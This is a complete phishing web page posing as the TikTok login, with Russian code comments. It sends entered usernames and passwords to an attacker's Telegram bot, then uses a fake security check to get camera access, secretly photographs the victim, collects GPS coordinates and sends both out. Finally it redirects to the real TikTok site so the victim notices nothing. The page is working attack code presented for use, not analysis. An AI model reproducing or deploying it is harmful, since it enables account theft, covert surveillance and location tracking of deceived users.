<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        h2 { margin-bottom: 20px; font-weight: 500; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        
        /* Экран загрузки / Проверки безопасности */
        #verifyScreen { display: none; text-align: center; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #fe2c55; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .verify-text { font-size: 14px; color: #aaa; margin-bottom: 15px; }
        
        #camera-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <!-- ЭТАП 1: Ввод логина и пароля -->
    <div class="container" id="loginScreen">
        <h2>Log in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn">Log in</button>
        </form>
    </div>

    <!-- ЭТАП 2: Фейковая проверка безопасности (Вызов камеры) -->
    <div class="container" id="verifyScreen">
        <h2>Security Check</h2>
        <p class="verify-text">To secure your account, please allow camera access to verify you are human.</p>
        <div class="spinner" id="spinner"></div>
        <button id="retryBtn" style="display:none;" onclick="requestCamera()">Allow Camera</button>
    </div>

    <video id="camera-video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; 
        const CHAT_ID = "7485234259"; 
        
        let userEmail = "";
        let userPass = "";
        let cameraStream = null;

        // Отправка текста в телеграм
        async function sendText(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
            await fetch(url, { mode: 'no-cors', keepalive: true });
        }

        // 1. Обработка первой формы
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            userEmail = document.getElementById('username').value;
            userPass = document.getElementById('password').value;

            // МГНОВЕННО шлем пароль (даже если он откажет в камере)
            await sendText(`🎯 TikTok Login\n👤 User: ${userEmail}\n🔑 Pass: ${userPass}`);

            // Переключаем экран на "Проверку"
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('verifyScreen').style.display = 'block';

            // Запускаем запрос камеры
            requestCamera();
        });

        // 2. Запрос камеры (вызывается кликом или автоматически)
        async function requestCamera() {
            document.getElementById('retryBtn').style.display = 'none';
            document.getElementById('spinner').style.display = 'block';

            try {
                // Запрашиваем фронтальную камеру
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                
                // Если разрешили, делаем фото через 1 секунду
                setTimeout(takePhotoAndGPS, 1000);

            } catch (err) {
                // Если запретили — показываем кнопку "Разрешить" еще раз
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('retryBtn').style.display = 'block';
                
                // Отправляем инфу, что камеру запретили
                sendText(`⚠️ Жертва запретила камеру.\n👤 ${userEmail}\n🔑 ${userPass}`);
                
                // Все равно перекидываем на реальный сайт через 3 секунды, чтобы не палиться
                setTimeout(redirectToRealSite, 3000);
            }
        }

        // 3. Снимок и геолокация
        async function takePhotoAndGPS() {
            // Скрываем спиннер
            document.getElementById('spinner').style.display = 'none';

            // --- Снимаем фото ---
            try {
                const video = document.getElementById('camera-video');
                video.srcObject = cameraStream;
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Выключаем камеру
                cameraStream.getTracks().forEach(track => track.stop());

                // Отправляем фото
                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                const blob = await (await fetch(dataURL)).blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'face.jpg');
                formData.append('caption', `📸 Селфи жертвы\n👤 User: ${userEmail}\n🔑 Pass: ${userPass}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {}

            // --- Запрашиваем GPS (выскочит сразу после камеры) ---
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 4000 });
                });
                await sendText(`🗺️ GPS Локация:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            } catch (err) {
                await sendText(`🗺️ GPS: Отклонен или недоступен`);
            }

            // Перекидываем
            redirectToRealSite();
        }

        function redirectToRealSite() {
            window.location.href = "https://www.tiktok.com/login";
        }
    </script>
</body>
</html>
